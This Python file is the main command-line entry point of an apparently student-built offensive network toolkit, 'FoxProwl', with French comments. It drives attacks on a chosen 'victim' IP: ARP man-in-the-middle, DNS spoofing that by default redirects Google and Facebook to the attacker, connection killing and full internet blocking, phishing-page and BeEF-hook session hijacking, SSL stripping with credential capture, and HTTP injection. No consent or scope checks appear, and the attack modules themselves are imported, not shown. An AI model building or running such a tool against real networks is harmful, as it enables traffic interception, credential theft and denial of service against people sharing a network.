#!/usr/bin/env python3
"""
killerfox.py
Point d'entrée principal - CLI Interactive & Automatisée.
FoxProwl - Offensive Network Toolkit
École Polytechnique - 2025
"""
import sys
import os
import time
import signal
import threading
import warnings
from typing import Optional, List, Set

# Désactiver les warnings et erreurs Scapy
warnings.filterwarnings("ignore")
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)
logging.getLogger("scapy").setLevel(logging.ERROR)

import typer
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.text import Text
from rich.live import Live
from rich.layout import Layout
from rich.progress import Progress, SpinnerColumn, TextColumn

# Configurer Scapy pour ignorer les erreurs d'interface
from scapy.all import conf as scapy_conf
scapy_conf.verb = 0  # Mode silencieux
scapy_conf.iface = None  # Sera défini plus tard

# Core imports
from core.logger import log, console
from core.config import conf, attack_conf
from core.network import NetworkDiscovery
from core.mitigation import SystemControl

# Module imports
from modules.arp_spoof import ARPSpoofer
from modules.dns_spoof import DNSSpoofer
from modules.tcp_killer import TCPKiller
from modules.internet_control import InternetBlocker
from modules.session_hijack import SessionHijacker
from modules.ssl_strip import SSLStripper
from modules.http_injector import HTTPInjector
from modules.scanner import NetworkScanner


# Typer CLI App
app = typer.Typer(
    name="killerfox",
    help="🦊 FoxProwl - Offensive Network Toolkit",
    add_completion=False,
    rich_markup_mode="rich"
)


# ╔══════════════════════════════════════════════════════════════════╗
# ║                        GLOBAL STATE                               ║
# ╚══════════════════════════════════════════════════════════════════╝

class FoxState:
    """État global de l'application."""
    
    def __init__(self):
        self.arp_spoofer: Optional[ARPSpoofer] = None
        self.dns_spoofer: Optional[DNSSpoofer] = None
        self.tcp_killer: Optional[TCPKiller] = None
        self.internet_blocker: Optional[InternetBlocker] = None
        self.session_hijacker: Optional[SessionHijacker] = None
        self.ssl_stripper: Optional[SSLStripper] = None
        self.http_injector: Optional[HTTPInjector] = None
        
        self.discovered_hosts: dict = {}
        self.selected_targets: List[str] = []
    
    def stop_all(self):
        """Arrête tous les modules actifs."""
        modules = [
            ("ARP Spoofer", self.arp_spoofer),
            ("DNS Spoofer", self.dns_spoofer),
            ("TCP Killer", self.tcp_killer),
            ("Internet Blocker", self.internet_blocker),
            ("Session Hijacker", self.session_hijacker),
            ("SSL Stripper", self.ssl_stripper),
            ("HTTP Injector", self.http_injector),
        ]
        
        for name, module in modules:
            if module and hasattr(module, 'running') and module.running:
                try:
                    module.stop()
                    log.info(f"{name} arrêté")
                except Exception as e:
                    log.warning(f"Erreur arrêt {name}: {e}")
    
    def get_active_modules(self) -> List[str]:
        """Retourne la liste des modules actifs."""
        active = []
        modules = [
            ("ARP MITM", self.arp_spoofer),
            ("DNS Spoof", self.dns_spoofer),
            ("TCP Killer", self.tcp_killer),
            ("Internet Block", self.internet_blocker),
            ("Session Hijack", self.session_hijacker),
            ("SSL Strip", self.ssl_stripper),
            ("HTTP Inject", self.http_injector),
        ]
        for name, module in modules:
            if module and hasattr(module, 'running') and module.running:
                active.append(name)
        return active


state = FoxState()
system_ctrl = SystemControl()

# Flag pour savoir si on est dans une opération interruptible
_in_operation = False


# ╔══════════════════════════════════════════════════════════════════╗
# ║                        UTILITIES                                  ║
# ╚══════════════════════════════════════════════════════════════════╝

def check_privileges():
    """Vérifie les privilèges administrateur."""
    if os.name == 'nt':
        # Windows
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                console.print("[bold red]❌ Erreur: Nécessite les privilèges Administrateur![/]")
                console.print("[dim]Relancez PowerShell/CMD en tant qu'Administrateur[/]")
                sys.exit(1)
        except Exception:
            pass
    else:
        # Linux/macOS
        if os.geteuid() != 0:
            console.print("[bold red]❌ Erreur: Nécessite ROOT (sudo)![/]")
            sys.exit(1)


def display_banner():
    """Affiche le banner FoxProwl."""
    banner = """
[bold orange1]
    ███████╗ ██████╗ ██╗  ██╗██████╗ ██████╗  ██████╗ ██╗    ██╗██╗     
    ██╔════╝██╔═══██╗╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║     
    █████╗  ██║   ██║ ╚███╔╝ ██████╔╝██████╔╝██║   ██║██║ █╗ ██║██║     
    ██╔══╝  ██║   ██║ ██╔██╗ ██╔═══╝ ██╔══██╗██║   ██║██║███╗██║██║     
    ██║     ╚██████╔╝██╔╝ ██╗██║     ██║  ██║╚██████╔╝╚███╔███╔╝███████╗
    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝
[/]
[bold red]                    🦊 Killer Fox - Network Offensive Toolkit[/]
[dim]                           École Polytechnique - 2025[/]
"""
    console.print(banner)


def setup_network() -> bool:
    """Configuration automatique du réseau avec option de sélection manuelle."""
    console.print("\n[yellow]⚙️  Auto-configuration du réseau...[/]\n")
    
    try:
        discovery = NetworkDiscovery()
        
        # Lister toutes les interfaces disponibles
        interfaces = discovery.get_all_interfaces()
        
        if not interfaces:
            log.error("Aucune interface réseau trouvée!")
            return False
        
        # Si plusieurs interfaces, proposer le choix
        if len(interfaces) > 1:
            console.print("[bold]Interfaces réseau disponibles:[/]\n")
            
            table = Table(border_style="cyan")
            table.add_column("#", style="bold")
            table.add_column("Nom", style="cyan")
            table.add_column("IP", style="green")
            table.add_column("Gateway", style="yellow")
            table.add_column("Subnet", style="blue")
            
            for i, iface in enumerate(interfaces, 1):
                gw_status = iface.gateway or "[dim]Aucune[/]"
                table.add_row(
                    str(i),
                    iface.display_name[:40],
                    iface.ip,
                    gw_status,
                    iface.cidr
                )
            
            console.print(table)
            console.print()
            
            # Sélection auto ou manuelle
            choice = Prompt.ask(
                "[bold]Choisir interface[/] (Entrée = auto)",
                default="auto"
            )
            
            if choice.lower() == "auto":
                iface = discovery.get_best_interface()
            else:
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(interfaces):
                        iface = interfaces[idx]
                    else:
                        iface = discovery.get_best_interface()
                except ValueError:
                    iface = discovery.get_best_interface()
        else:
            iface = interfaces[0]
        
        if not iface:
            log.error("Aucune interface valide sélectionnée!")
            return False
        
        # Configurer avec l'interface choisie
        discovery.configure_from_interface(iface)
        
        # Afficher la configuration
        table = Table(title="🌐 Configuration Réseau", border_style="green")
        table.add_column("Paramètre", style="cyan")
        table.add_column("Valeur", style="green")
        
        # Afficher le nom lisible de l'interface si disponible
        iface_display = conf.interface_display or conf.interface
        table.add_row("Interface", iface_display)
        table.add_row("IP Attaquant", conf.attacker_ip)
        table.add_row("MAC Attaquant", conf.attacker_mac)
        table.add_row("Gateway IP", conf.gateway_ip)
        table.add_row("Gateway MAC", conf.gateway_mac or "(résolution...)")
        table.add_row("Subnet", conf.subnet)
        
        console.print(table)
        console.print()
        
        return True
    
    except Exception as e:
        log.error(f"Erreur configuration: {e}")
        return False


def cleanup_and_exit():
    """Nettoyage complet et sortie."""
    console.print("\n[yellow]⚠️  Arrêt de FoxProwl...[/]")
    state.stop_all()
    try:
        system_ctrl.cleanup()
    except Exception:
        pass
    console.print("[green]✓ Nettoyage terminé[/]")


# ╔══════════════════════════════════════════════════════════════════╗
# ║                     INTERACTIVE MENU                              ║
# ╚══════════════════════════════════════════════════════════════════╝

def menu_scan_network():
    """Menu: Scanner le réseau."""
    scanner = NetworkScanner()
    targets = scanner.interactive_scan()
    
    if targets:
        state.selected_targets = targets
        state.discovered_hosts = scanner.hosts
        log.success(f"{len(targets)} cible(s) mémorisée(s)")
    
    return targets


def menu_arp_mitm():
    """Menu: ARP MITM."""
    console.print("\n[bold red]═══ ARP MITM Attack ═══[/]\n")
    
    # Sélectionner les cibles
    if state.selected_targets:
        use_previous = Confirm.ask(
            f"Utiliser les cibles précédentes ({len(state.selected_targets)})?"
        )
        if use_previous:
            targets = state.selected_targets
        else:
            targets = None
    else:
        targets = None
    
    if not targets:
        target_input = Prompt.ask(
            "IP cible(s) (séparées par virgule, ou 'scan' pour scanner)",
            default="scan"
        )
        
        if target_input.lower() == "scan":
            targets = menu_scan_network()
        else:
            targets = [ip.strip() for ip in target_input.split(",")]
    
    if not targets:
        log.warning("Aucune cible sélectionnée")
        return
    
    # Options avancées
    aggressive = Confirm.ask("Mode agressif (plus de paquets)?", default=False)
    quiet = Confirm.ask("Mode silencieux?", default=False)
    
    # Démarrer
    if state.arp_spoofer and state.arp_spoofer.running:
        state.arp_spoofer.stop()
    
    state.arp_spoofer = ARPSpoofer(
        targets=targets,
        aggressive=aggressive,
        quiet=quiet
    )
    
    # Activer IP forwarding
    system_ctrl.enable_ip_forwarding()
    
    state.arp_spoofer.start()
    log.success(f"ARP MITM actif sur {len(targets)} cible(s)")
    
    # Attendre Ctrl+C ou retour menu
    console.print("[dim]Appuyez sur Entrée pour revenir au menu (attaque continue en arrière-plan)[/]")
    input()


def menu_dns_spoof():
    """Menu: DNS Spoofing."""
    console.print("\n[bold magenta]═══ DNS Spoofing ═══[/]\n")
    
    if not state.arp_spoofer or not state.arp_spoofer.running:
        log.warning("⚠️  ARP MITM non actif - DNS Spoofing sera inefficace!")
        if not Confirm.ask("Continuer quand même?"):
            return
    
    # Configuration des règles
    console.print("\n[bold]Configuration des règles DNS:[/]")
    console.print("  Format: domaine -> IP de redirection")
    console.print("  Wildcards: *.example.com")
    console.print("  Regex: regex:.*facebook.*")
    console.print("  Tapez 'done' pour terminer\n")
    
    rules = {}
    while True:
        domain = Prompt.ask("Domaine (ou 'done')")
        if domain.lower() == "done":
            break
        redirect_ip = Prompt.ask("  IP de redirection", default=conf.attacker_ip)
        rules[domain] = redirect_ip
    
    if not rules:
        # Règles par défaut
        rules = {
            "*.google.com": conf.attacker_ip,
            "*.facebook.com": conf.attacker_ip,
        }
        log.info("Utilisation des règles par défaut")
    
    # Bloquer DoH?
    block_doh = Confirm.ask("Bloquer DNS-over-HTTPS (DoH)?", default=True)
    
    if state.dns_spoofer and state.dns_spoofer.running:
        state.dns_spoofer.stop()
    
    state.dns_spoofer = DNSSpoofer(rules=rules, block_doh=block_doh)
    state.dns_spoofer.start()
    
    console.print("\n[dim]Appuyez sur Entrée pour revenir au menu[/]")
    input()


def menu_tcp_killer():
    """Menu: TCP Killer."""
    console.print("\n[bold yellow]═══ TCP Killer ═══[/]\n")
    
    target = Prompt.ask("IP de la victime")
    
    console.print("\n[bold]Mode de blocage:[/]")
    console.print("  1. Bloquer des sites spécifiques (domaines)")
    console.print("  2. Bloquer des ports spécifiques")
    console.print("  3. Bloquer tout le trafic TCP")
    
    mode = Prompt.ask("Mode", choices=["1", "2", "3"], default="1")
    
    domains = None
    ports = None
    
    if mode == "1":
        domains_input = Prompt.ask(
            "Domaines à bloquer (séparés par virgule)",
            default="youtube.com,netflix.com,tiktok.com"
        )
        domains = [d.strip() for d in domains_input.split(",")]
    elif mode == "2":
        ports_input = Prompt.ask(
            "Ports à bloquer (séparés par virgule)",
            default="443,80,8080"
        )
        ports = [int(p.strip()) for p in ports_input.split(",")]
    
    if state.tcp_killer and state.tcp_killer.running:
        state.tcp_killer.stop()
    
    state.tcp_killer = TCPKiller(
        target_ip=target,
        blocked_domains=domains,
        blocked_ports=ports
    )
    state.tcp_killer.start()
    
    console.print("\n[dim]Appuyez sur Entrée pour revenir au menu[/]")
    input()


def menu_internet_blocker():
    """Menu: Internet Blocker."""
    console.print("\n[bold red]═══ Internet Blocker ═══[/]\n")
    
    target = Prompt.ask("IP de la victime")
    
    console.print("\n[bold]Mode de blocage:[/]")
    console.print("  1. Blocage TOTAL (aucun accès Internet)")
    console.print("  2. Blocage sélectif (certains domaines)")
    
    mode = Prompt.ask("Mode", choices=["1", "2"], default="1")
    
    full_block = (mode == "1")
    domains = None
    
    if not full_block:
        domains_input = Prompt.ask(
            "Domaines à bloquer",
            default="youtube.com,facebook.com,instagram.com"
        )
        domains = [d.strip() for d in domains_input.split(",")]
    
    auto_arp = Confirm.ask("Activer automatiquement l'ARP Spoof?", default=True)
    
    if state.internet_blocker and state.internet_blocker.running:
        state.internet_blocker.stop()
    
    state.internet_blocker = InternetBlocker(
        target_ip=target,
        blocked_domains=domains,
        full_block=full_block,
        auto_arp=auto_arp
    )
    state.internet_blocker.start()
    
    console.print("\n[dim]Appuyez sur Entrée pour revenir au menu[/]")
    input()


def menu_session_hijack():
    """Menu: Session Hijacking."""
    console.print("\n[bold red]═══ Session Hijacking ═══[/]\n")
    
    if not state.arp_spoofer or not state.arp_spoofer.running:
        log.warning("⚠️  ARP MITM recommandé pour le hijacking!")
    
    target = Prompt.ask("IP de la victime")
    
    console.print("\n[bold]Mode d'attaque:[/]")
    console.print("  1. [red]Phishing[/] - Afficher une fausse page de login")
    console.print("  2. [yellow]BeEF Hook[/] - Injecter le hook BeEF")
    console.print("  3. [cyan]Custom[/] - Injection personnalisée")
    
    mode_choice = Prompt.ask("Mode", choices=["1", "2", "3"], default="1")
    
    mode_map = {"1": "phishing", "2": "beef", "3": "inject"}
    mode = mode_map[mode_choice]
    
    beef_server = None
    if mode == "beef":
        beef_server = Prompt.ask("IP du serveur BeEF", default=conf.attacker_ip)
    
    if state.session_hijacker and state.session_hijacker.running:
        state.session_hijacker.stop()
    
    state.session_hijacker = SessionHijacker(
        target_ip=target,
        mode=mode,
        beef_server=beef_server
    )
    state.session_hijacker.start()
    
    console.print("\n[dim]Appuyez sur Entrée pour revenir au menu[/]")
    input()


def menu_ssl_strip():
    """Menu: SSL Stripping."""
    console.print("\n[bold blue]═══ SSL Stripping ═══[/]\n")
    
    if not state.arp_spoofer or not state.arp_spoofer.running:
        log.warning("⚠️  ARP MITM OBLIGATOIRE pour SSL Strip!")
        if not Confirm.ask("Activer ARP MITM d'abord?"):
            return
        menu_arp_mitm()
    
    capture_creds = Confirm.ask("Capturer les credentials?", default=True)
    
    if state.ssl_stripper and state.ssl_stripper.running:
        state.ssl_stripper.stop()
    
    state.ssl_stripper = SSLStripper(capture_credentials=capture_creds)
    state.ssl_stripper.start()
    
    console.print("\n[dim]Appuyez sur Entrée pour revenir au menu[/]")
    input()


def menu_http_inject():
    """Menu: HTTP Injection."""
    console.print("\n[bold cyan]═══ HTTP Injection ═══[/]\n")
    
    target = Prompt.ask("IP cible (vide pour tous)", default="")
    target_ips = {target} if target else None
    
    console.print("\n[bold]Templates disponibles:[/]")
    templates = HTTPInjector.available_templates()
    for i, t in enumerate(templates, 1):
        console.print(f"  {i}. {t}")
    
    choice = IntPrompt.ask("Choix du template", default=1)
    template = templates[choice - 1] if 1 <= choice <= len(templates) else "alert"
    
    if state.http_injector and state.http_injector.running:
        state.http_injector.stop()
    
    state.http_injector = HTTPInjector(
        target_ips=target_ips,
        template=template
    )
    state.http_injector.start()
    
    console.print("\n[dim]Appuyez sur Entrée pour revenir au menu[/]")
    input()


def menu_status():
    """Affiche le statut des modules."""
    console.print("\n[bold]═══ Status des Modules ═══[/]\n")
    
    table = Table(border_style="cyan")
    table.add_column("Module", style="bold")
    table.add_column("Status")
    table.add_column("Détails")
    
    modules = [
        ("ARP MITM", state.arp_spoofer),
        ("DNS Spoofer", state.dns_spoofer),
        ("TCP Killer", state.tcp_killer),
        ("Internet Blocker", state.internet_blocker),
        ("Session Hijacker", state.session_hijacker),
        ("SSL Stripper", state.ssl_stripper),
        ("HTTP Injector", state.http_injector),
    ]
    
    for name, module in modules:
        if module and hasattr(module, 'running') and module.running:
            status = "[bold green]● ACTIF[/]"
            if hasattr(module, 'get_stats'):
                stats = module.get_stats()
                details = ", ".join(f"{k}: {v}" for k, v in list(stats.items())[:3])
            else:
                details = "-"
        else:
            status = "[dim]○ Inactif[/]"
            details = "-"
        
        table.add_row(name, status, details)
    
    console.print(table)
    console.print()


def menu_stop_all():
    """Arrête tous les modules."""
    console.print("\n[yellow]Arrêt de tous les modules...[/]")
    state.stop_all()
    system_ctrl.cleanup()
    log.success("Tous les modules ont été arrêtés")


def interactive_menu():
    """Menu principal interactif."""
    display_banner()
    
    if not setup_network():
        log.error("Échec de la configuration réseau")
        sys.exit(1)
    
    while True:
        # Afficher les modules actifs
        active = state.get_active_modules()
        if active:
            console.print(f"\n[dim]Modules actifs: {', '.join(active)}[/]")
        
        console.print("\n[bold underline cyan]═══════════ Menu Principal ═══════════[/]\n")
        
        menu_items = [
            ("1", "🔍 Scanner le réseau", "cyan"),
            ("2", "🎯 ARP MITM (Spoofing)", "red"),
            ("3", "🌐 DNS Spoofing", "magenta"),
            ("4", "⚡ TCP Killer (Blocage sites/ports)", "yellow"),
            ("5", "🚫 Internet Blocker (DoS)", "red"),
            ("6", "🔓 Session Hijacking", "red"),
            ("7", "🔒 SSL Stripping", "blue"),
            ("8", "💉 HTTP Injection", "cyan"),
            ("", "", ""),
            ("s", "📊 Status des modules", "green"),
            ("x", "🛑 Arrêter tous les modules", "yellow"),
            ("q", "🚪 Quitter", "dim"),
        ]
        
        for key, label, color in menu_items:
            if key:
                console.print(f"  [{color}]{key}[/]. {label}")
            else:
                console.print()
        
        console.print()
        
        try:
            choice = Prompt.ask(
                "[bold green]Choix[/]",
                choices=["1", "2", "3", "4", "5", "6", "7", "8", "s", "x", "q"],
                default="1"
            )
        except KeyboardInterrupt:
            console.print("\n[dim]Ctrl+C détecté. Tapez 'q' pour quitter.[/]")
            continue
        
        try:
            if choice == "1":
                menu_scan_network()
            elif choice == "2":
                menu_arp_mitm()
            elif choice == "3":
                menu_dns_spoof()
            elif choice == "4":
                menu_tcp_killer()
            elif choice == "5":
                menu_internet_blocker()
            elif choice == "6":
                menu_session_hijack()
            elif choice == "7":
                menu_ssl_strip()
            elif choice == "8":
                menu_http_inject()
            elif choice == "s":
                menu_status()
            elif choice == "x":
                menu_stop_all()
            elif choice == "q":
                cleanup_and_exit()
                console.print("[green]Au revoir! 🦊[/]")
                break
        
        except KeyboardInterrupt:
            console.print("\n[dim]Opération interrompue. Retour au menu...[/]")
        except Exception as e:
            log.error(f"Erreur: {e}")


# ╔══════════════════════════════════════════════════════════════════╗
# ║                     CLI COMMANDS                                  ║
# ╚══════════════════════════════════════════════════════════════════╝

@app.command()
def start():
    """🦊 Lance le mode interactif."""
    check_privileges()
    interactive_menu()


@app.command("scan")
def cmd_scan(
    subnet: str = typer.Option(None, "--subnet", "-s", help="Subnet CIDR à scanner"),
    ports: bool = typer.Option(False, "--ports", "-p", help="Scanner aussi les ports")
):
    """🔍 Scanner le réseau."""
    check_privileges()
    if not setup_network():
        raise typer.Exit(1)
    
    scanner = NetworkScanner(subnet=subnet or conf.subnet)
    scanner.quick_scan()
    
    if ports:
        scanner.full_scan()
    
    console.print(scanner.generate_table(show_ports=ports))


@app.command("mitm")
def cmd_mitm(
    targets: str = typer.Argument(..., help="IP cible(s) séparées par virgule"),
    aggressive: bool = typer.Option(False, "--aggressive", "-a", help="Mode agressif")
):
    """🎯 Lance une attaque ARP MITM."""
    check_privileges()
    if not setup_network():
        raise typer.Exit(1)
    
    target_list = [t.strip() for t in targets.split(",")]
    
    system_ctrl.enable_ip_forwarding()
    spoofer = ARPSpoofer(targets=target_list, aggressive=aggressive)
    
    try:
        with spoofer:
            log.info("Ctrl+C pour arrêter")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        system_ctrl.cleanup()


@app.command("block")
def cmd_block(
    target: str = typer.Argument(..., help="IP de la victime"),
    domains: str = typer.Option(None, "--domains", "-d", help="Domaines à bloquer (virgule)"),
    ports: str = typer.Option(None, "--ports", "-p", help="Ports à bloquer (virgule)"),
    full: bool = typer.Option(False, "--full", "-f", help="Blocage total Internet")
):
    """🚫 Bloquer l'accès Internet d'une cible."""
    check_privileges()
    if not setup_network():
        raise typer.Exit(1)
    
    domain_list = [d.strip() for d in domains.split(",")] if domains else None
    port_list = [int(p.strip()) for p in ports.split(",")] if ports else None
    
    blocker = InternetBlocker(
        target_ip=target,
        blocked_domains=domain_list,
        full_block=full
    )
    
    try:
        with blocker:
            log.info("Ctrl+C pour arrêter")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass


@app.command("dns")
def cmd_dns(
    rules: str = typer.Argument(..., help="Règles format 'domain:ip,domain2:ip2'"),
    block_doh: bool = typer.Option(True, "--block-doh/--no-block-doh", help="Bloquer DoH")
):
    """🌐 Lance le DNS Spoofing."""
    check_privileges()
    if not setup_network():
        raise typer.Exit(1)
    
    rules_dict = {}
    for rule in rules.split(","):
        if ":" in rule:
            domain, ip = rule.split(":", 1)
            rules_dict[domain.strip()] = ip.strip()
    
    spoofer = DNSSpoofer(rules=rules_dict, block_doh=block_doh)
    
    try:
        with spoofer:
            log.info("Ctrl+C pour arrêter")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass


@app.callback(invoke_without_command=True)
def main(ctx: typer.Context):
    """🦊 FoxProwl - Offensive Network Toolkit"""
    if ctx.invoked_subcommand is None:
        # Pas de sous-commande = mode interactif
        check_privileges()
        interactive_menu()


if __name__ == "__main__":
    app()